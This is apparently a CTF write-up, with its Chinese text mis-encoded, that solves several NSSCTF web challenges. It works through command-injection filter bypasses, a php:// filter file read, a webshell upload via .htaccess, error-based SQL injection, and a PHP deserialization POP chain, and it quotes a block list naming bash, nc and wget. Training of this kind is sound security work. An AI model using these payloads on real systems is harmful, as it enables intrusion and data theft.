<p>è¿™é‡Œå­—æ¯å’Œä¸€å †ç¬¦å·éƒ½è¢«è¿‡æ»¤äº†ï¼Œç´¢é¢åªèƒ½ç”¨æ•°å­—ï¼Œè€Œ<code>/</code> <code>~</code>ä¹Ÿæ²¡æœ‰è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬è€ƒè™‘ç”¨urlç¼–ç ,ç„¶åurlç¼–ç å–åï¼Œå–åä¹‹åçš„å­—ç¬¦åŸºæœ¬éƒ½æ˜¯ä¸å¯è§å­—ç¬¦ï¼Œæ‰€ä»¥å¯ä»¥ç»•è¿‡å­—æ¯<br>urlåœ¨å­—ç¬¦å‰åŠ <code>~</code>å°±æ˜¯å–å</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;system&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°~&#96;system<code>=%8C%86%8C%8B%9A%92     ~</code>ls &#x2F;&#96;&#x3D;%93%8C%DF%D0<br>ç„¶ååœ¨urlä¼ å…¥å‚æ•°çš„æ—¶å€™ï¼Œå†å–åå›å»å°±å¯ä»¥äº†(è®°å¾—åŠ åˆ†å·)</p>
<p><img src="https://pic1.imgdb.cn/item/67af3dd7d0e0a243d4ff4a18.png"><br>~ <code>cat fl*</code>&#x3D;%9C%9E%8B%DF%D0%99%93%D5<br>ç„¶åç»§ç»­å–åæ‰§è¡Œå°±å¾—åˆ°flag</p>
<h1 id="ez-ez-php"><a href="#ez-ez-php" class="headerlink" title="ez_ez_php"></a>ez_ez_php</h1><p>é¢˜ç›®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="number">0</span>, <span class="number">3</span>) === <span class="string">&quot;php&quot;</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Nice!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag.php</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™ä¸ªè¡¨ç¤ºfileå‚æ•°å¦‚æœå‰ä¸‰ä¸ªæ˜¯phpå°±åŒ…å«è¿™ä¸ªæ–‡ä»¶<br>æ‰€ä»¥ç”¨phpä¼ªåè®®æŸ¥çœ‹æ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:29953/?file=php://filter/read=convert.base64-encode/resource=flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Nice!!!TlNTQ1RGe2NjZjg2ODBlLWViZGItNGIxZC1iNzFjLTY2ZDYxNjI5YjhhMH0K</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="built_in">echo</span> TlNTQ1RGe2NjZjg2ODBlLWViZGItNGIxZC1iNzFjLTY2ZDYxNjI5YjhhMH0K | <span class="built_in">base64</span> -d</span><br><span class="line">NSSCTF&#123;ccf8680e-ebdb-4b1d-b71c-66d61629b8a0&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="easyupload3-0"><a href="#easyupload3-0" class="headerlink" title="easyupload3.0"></a>easyupload3.0</h1><p>é¢˜ç›®å’Œä¹‹å‰çš„uploadï¼Œä¹Ÿæ˜¯ ä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬çš„phpæ”¹æˆçš„1.jpg<br>ä½†æ˜¯æ”¹åŒ…åç¼€æ”¹æˆphpè¿™é‡Œå°±ä¸è¡Œäº†ï¼Œä½†æ˜¯å¯ä»¥å‘ç°è¿™ä¸ªæ˜¯ä¸€ä¸ªapacheçš„æœåŠ¡<br><img src="https://pic1.imgdb.cn/item/67af5b6cd0e0a243d4ff588c.png"><br>è¿™é‡Œå­¦ä¹ äº†è¦ä¸Šä¼ <code>.htaccess </code>æ–‡ä»¶<br>.htaccess æ˜¯ä¸€ä¸ªçº¯æ–‡æœ¬æ–‡ä»¶ï¼Œå®ƒé‡Œé¢å­˜æ”¾ç€ Apache æœåŠ¡å™¨é…ç½®ç›¸å…³çš„æŒ‡ä»¤ã€‚<br>.htaccess ä¸»è¦çš„ä½œç”¨æœ‰ï¼šURL é‡å†™ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ã€MIME ç±»å‹é…ç½®ä»¥åŠè®¿é—®æƒé™æ§åˆ¶ç­‰ã€‚ä¸»è¦ä½“ç°åœ¨ä¼ªé™æ€çš„åº”ç”¨ã€å›¾ç‰‡é˜²ç›—é“¾ã€è‡ªå®šä¹‰ 404 é”™è¯¯é¡µé¢ã€é˜»æ­¢ &#x2F; å…è®¸ç‰¹å®š IP&#x2F;IP æ®µã€ç›®å½•æµè§ˆä¸ä¸»é¡µã€ç¦æ­¢è®¿é—®æŒ‡å®šæ–‡ä»¶ç±»å‹ã€æ–‡ä»¶å¯†ç ä¿æŠ¤ç­‰ã€‚<br>.htaccess çš„ç”¨é€”èŒƒå›´ä¸»è¦é’ˆå¯¹å½“å‰ç›®å½•ã€‚<br>ç„¶åå†™ä¸€ä¸ª.htaccessæ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;\.jpg$&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute">SetHandler</span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>ä¸Šä¼ è¿™ä¸ªæ–‡ä»¶ä¹‹åï¼Œè¿™ä¸ªç›®å½•ä¸‹çš„jpgæ–‡ä»¶å°±ä¼šè¢«è§£ææˆphpæ–‡ä»¶<br>å› ä¸ºæˆ‘ä»¬åˆšæ‰å·²ç»ä¸Šä¼ äº†ä¸€å¥è¯æœ¨é©¬çš„jpgï¼Œç°åœ¨ç”¨èšå‰‘è¿æ¥å°±èƒ½æ‰¾åˆ°flag<br><img src="https://pic1.imgdb.cn/item/67af5dafd0e0a243d4ff58fb.png"></p>
<h1 id="error"><a href="#error" class="headerlink" title="error"></a>error</h1><p><img src="https://pic1.imgdb.cn/item/67b002b5d0e0a243d4ff80fd.png"><br>è¾“å…¥ä¸€ä¸ªå€¼ä¹‹åä¼šè·³è½¬åˆ°<code>http://node7.anna.nssctf.cn:28229/index.php?id=-1</code>è€Œä¸”æœ‰å›æ˜¾</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SMALI"><figure class="iseeu highlight /smali"><table><tr><td class="code"><pre><span class="line">idï¼š1&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">You have an error in your SQ<span class="class">L syntax;</span><span class="built_in"> check </span>the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œé€šè¿‡æŠ¥é”™ä¿¡æ¯ï¼Œåˆ¤æ–­ä¸ºå­—ç¬¦å‹æ³¨å…¥<br>ç„¶åå°è¯•<code>--+</code>å’Œ<code>#</code>å¾—å‡ºè¿™é‡Œç”¨çš„æ³¨é‡Šç¬¦æ˜¯<code>#</code><br>1.åˆ¤æ–­åˆ—æ•°</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRMSH"><figure class="iseeu highlight /crmsh"><table><tr><td class="code"><pre><span class="line">idï¼š<span class="number">1</span>&#x27; <span class="keyword">order</span> <span class="title">by</span> <span class="number">3</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">æ²¡æœ‰æç¤º...........</span><br><span class="line"></span><br><span class="line">idï¼š<span class="number">1</span>&#x27; <span class="keyword">order</span> <span class="title">by</span> <span class="number">4</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Unknown column &#x27;<span class="number">4</span>&#x27; <span class="keyword">in</span> &#x27;<span class="keyword">order</span> <span class="title">clause</span>&#x27;</span><br></pre></td></tr></table></figure></div>
<p>2.çˆ†åº“å<br>è¿™é‡Œè¦æ ¹æ®æŠ¥é”™ä¿¡æ¯æ¥çš„å‡ºåº“åï¼Œå­¦ä¹ ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼š<br><code>extractvalue (1,concat (0x7e,database ()))</code><br>EXTRACTVALUE() æ˜¯ MySQL çš„ä¸€ä¸ª XML å¤„ç†å‡½æ•°ï¼Œå®ƒç”¨äºä» XML æ•°æ®ä¸­æå–ç‰¹å®šçš„å€¼.ä½†å¦‚æœä¼ å…¥ é XML ç»“æ„ çš„ XPathï¼Œä¼šæŠ¥é”™ï¼Œå¹¶åœ¨é”™è¯¯ä¿¡æ¯ä¸­æ³„éœ²æ•°æ®.CONCAT() ç”¨äºæ‹¼æ¥å­—ç¬¦ä¸²ã€‚0x7e æ˜¯ åå…­è¿›åˆ¶çš„ ~ï¼ˆæ³¢æµªå·ï¼‰</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">id</span>ï¼š<span class="number">1</span>&#x27; union select <span class="number">1</span>,<span class="number">2</span>,extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,database()))#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">XPATH</span> syntax error: &#x27;~test_db&#x27;</span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°åº“åtest_dbã€‚<br>2.çˆ†è¡¨<br>åªè¦è®©æŠ¥é”™ä¿¡æ¯é‡Œé¢çˆ†å‡ºè¡¨åå°±å¯ä»¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSHARP"><figure class="iseeu highlight /csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>â€™ <span class="keyword">and</span> <span class="number">1</span>=extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">table_name</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=database())))<span class="meta">#</span></span><br><span class="line"></span><br><span class="line">æˆ–</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">idï¼š<span class="number">-1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">table_name</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema</span>=database())))<span class="meta">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~test_tb,users&#x27;</span></span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°è¡¨åtest_tb,users<br>3.çˆ†åˆ—å</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSHARP"><figure class="iseeu highlight /csharp"><table><tr><td class="code"><pre><span class="line"><span class="number">-1&#x27;</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="function"><span class="keyword">select</span> <span class="title">group_concat</span>(<span class="params">column_name</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name</span>=<span class="string">&#x27;test_tb&#x27;</span>)))<span class="meta">#</span></span><br><span class="line"></span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~id,flag&#x27;</span></span><br></pre></td></tr></table></figure></div>
<p>4.æŸ¥flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">id</span>ï¼š-<span class="number">1</span>&#x27; union select <span class="number">1</span>,<span class="number">2</span>,extractvalue(<span class="number">0</span>x7e,(select group_concat(flag) from test_tb)) #</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">XPATH</span> syntax error: &#x27;&#123;ace8876e-<span class="number">87</span>f9-<span class="number">4526</span>-<span class="number">862</span>a-ff5d963&#x27;</span><br></pre></td></tr></table></figure></div>
<p>ä½†æ˜¯è¿™é‡Œé»˜è®¤åªè¿”å›äº†32ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬ç”¨substringå¾—åˆ°å®Œæ•´</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">-1</span>&#x27; <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="built_in">extractvalue</span>(<span class="number">0x7e</span>,(<span class="built_in">select</span> <span class="built_in">substring</span>(<span class="built_in">group_concat</span>(flag),<span class="number">25</span>,<span class="number">32</span>) from test_tb)) <span class="meta">#</span></span><br><span class="line"></span><br><span class="line">idï¼š<span class="number">-1</span>&#x27; <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="built_in">extractvalue</span>(<span class="number">0x7e</span>,(<span class="built_in">select</span> <span class="built_in">substring</span>(<span class="built_in">group_concat</span>(flag),<span class="number">25</span>,<span class="number">32</span>) from test_tb)) <span class="meta">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">XPATH syntax <span class="built_in">error</span>: &#x27;a-ff5d9638a322&#125;&#x27;</span><br></pre></td></tr></table></figure></div>
<p>å¯ä»¥æ‹¼æ¥å‡ºå®Œæ•´flag<code>NSSCTF&#123;ace8876e-87f9-4526-862a-ff5d9638a322&#125;</code></p>
<p>è¿™é¢˜å¯ä»¥å­¦ä¹ åˆ¤æ–­æ³¨å…¥ç±»å‹ï¼ŒæŠ¥é”™å¦‚ä½•æ³¨å…¥ï¼Œextractvalueå‡½æ•°ï¼Œsubstringç»•è¿‡è¾“å‡ºé™åˆ¶</p>
<h1 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h1><p>é¢˜ç›®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$w00m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;w00m&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$w00m</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™é¢˜è€ƒæŸ¥çš„æ˜¯ååºåˆ—åŒ–é“¾<br>è¿™é‡Œå¹¶æ²¡æœ‰ç›´æ¥æ‰§è¡Œw44mä¸­çš„å†…å®¹ï¼Œå¹¶ä¸”è¿™é‡Œçš„admin å’Œ passwd æ˜¯å†…éƒ¨çš„ï¼Œä¸èƒ½è¢«æ›´æ”¹ï¼Œéœ€è¦å€ŸåŠ©w22m å’Œ  w33mæ¥æ‰§è¡Œw44mä¸­çš„Getflagè¿™ä¸ªå‡½æ•°<br>é¦–å…ˆw22mæ˜¯å…¥å£ï¼Œè¿™é‡Œæ‰§è¡Œdestruct  æ¥ç€è·³åˆ°w33må› ä¸ºw00m <mark>è¢«echoäº†ï¼Œå°±æ˜¯è¢«å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨</mark> æ‰€ä»¥ä¼šè°ƒç”¨toString  </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XL"><figure class="iseeu highlight /xl"><table><tr><td class="code"><pre><span class="line"># <span class="function"><span class="title">w22m</span>.__destruct().w00m-&gt;</span><span class="function"><span class="title">w33m</span>.__toString().w00m-&gt;</span>w44m.Getflag()</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MEL"><figure class="iseeu highlight /mel"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class w44m&#123;</span><br><span class="line"></span><br><span class="line">    private $admin = <span class="string">&#x27;w44m&#x27;</span>;</span><br><span class="line">    protected $passwd = <span class="string">&#x27;08067&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">&#125;</span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new w22m();</span><br><span class="line">$b = new w33m();</span><br><span class="line">$c = new w44m();</span><br><span class="line"></span><br><span class="line">$a -&gt; w00m = $b;</span><br><span class="line">$b -&gt; w00m = $c;</span><br><span class="line">$b -&gt; w22m = <span class="string">&#x27;Getflag&#x27;</span>;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67b01013d0e0a243d4ff8737.png"><br>è¿™é‡Œå…ˆæ–°å»ºä¸‰ä¸ªç±»ï¼Œ$aä¼ å…¥$bï¼Œè¡¨ç¤ºæ‰§è¡Œdestructçš„æ—¶å€™å°±æ‰§è¡Œ$bç±»é‡Œé¢çš„å†…å®¹ï¼Œ<br>ç„¶å$b-&gt;w00m&#x3D;$c è¡¨ç¤ºå…ˆè°ƒç”¨$cç±»ä¸­çš„å†…å®¹ï¼Œè®©ä»–æ‰§è¡ŒGetflag è¿™ä¸ªå‡½æ•°<br>è¿™é¢˜é‡Œé¢æœ€åè¦ç”¨<mark>urlencode</mark></p>
<h1 id="finalrce"><a href="#finalrce" class="headerlink" title="finalrce"></a>finalrce</h1><p>é¢˜ç›®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;</span>,<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry,you can&#x27;t use this.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Can you see anything?&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œå°±æ˜¯è€ƒæŸ¥æ€ä¹ˆç»•è¿‡äº† ä½†æ˜¯è¿™é‡Œåˆ¤æ–­çš„æ¡ä»¶è¿˜æ˜¯æ¯”è¾ƒæ¾<br>åœ¨linuxä¸­å‘½ä»¤ä¸­é—´æœ‰åˆ†éš”ç¬¦ä¹Ÿå¯ä»¥ç…§æ ·æ‰§è¡Œå‘½ä»¤æ¯”å¦‚<code>l&#39;&#39;s l/s</code>ï¼Œè¿˜éœ€è¦çŸ¥é“<code>tee</code>ï¼Œè¿™ä¸ªæŒ‡ä»¤ä¼šä»æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®ï¼Œå¹¶å°†å…¶åŒæ—¶è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºå’Œä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶ä¸­<br>poc </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TCL"><figure class="iseeu highlight /tcl"><table><tr><td class="code"><pre><span class="line">?url=l&#x27;&#x27;s / | tee <span class="number">1.</span>txt </span><br><span class="line"></span><br><span class="line"><span class="comment">#http://node4.anna.nssctf.cn:28754/1.txt</span></span><br><span class="line">a_here_is_a_f1ag</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flllllaaaaaaggggggg</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line"><span class="keyword">proc</span><span class="title"></span></span><br><span class="line"><span class="title">root</span></span><br><span class="line">run<span class="title"></span></span><br><span class="line"><span class="title">sbin</span></span><br><span class="line">srv<span class="title"></span></span><br><span class="line"><span class="title">sys</span></span><br><span class="line">tmp<span class="title"></span></span><br><span class="line"><span class="title">usr</span></span><br><span class="line">var</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>é™¤äº†ç›´æ¥ç”¨catåŠ ä¸Šä¸­é—´æ‹¼æ¥å•å¼•å·çš„æ–¹å¼ï¼Œè¿˜æœ‰å¾ˆå¤šæ–¹å¼å¯ä»¥è¯»flagï¼Œæ¯”å¦‚<code>tac</code>æˆ–è€…<code>nl</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://node4.anna.nssctf.cn:<span class="number">28754</span>/?url=tac%<span class="number">20</span>/a_here_is_a_f1ag%<span class="number">20</span>|%<span class="number">20</span>tee%<span class="number">202</span>.txt</span><br><span class="line"></span><br><span class="line"><span class="attribute">true_flag_1s_1n_flllllaaaaaaggggggg</span></span><br></pre></td></tr></table></figure></div>
<p>ä½†æ˜¯laä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥éœ€è¦åœ¨laä¸­é—´åŠ ä¸Š&#x2F;æˆ–è€…ä¸Šé¢çš„é‚£äº›è¿‡æ»¤ç¬¦å·</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MAXIMA"><figure class="iseeu highlight /maxima"><table><tr><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:<span class="number">28754</span>/?url=tac%<span class="number">20</span>/flllll\aaaaaaggggggg%<span class="number">20</span>|tee%<span class="number">203.</span>txt</span><br><span class="line"></span><br><span class="line">http://node4.anna.nssctf.cn:<span class="number">28754</span>/<span class="number">3.</span>txt</span><br><span class="line">NSSCTF&#123;bce2e219-<span class="number">42b3</span>-45a2-b6f6-529ead4e2a20&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h1><p>é¢˜ç›®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">Want Me? Cross <span class="keyword">the</span> Waf</span><br><span class="line">çƒçƒä½ è¾“å…¥ç‚¹ä¸œè¥¿å§ï¼</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œåº”è¯¥æ˜¯è¦è€ƒæŸ¥sqlæ³¨å…¥çš„ç»•è¿‡</p>
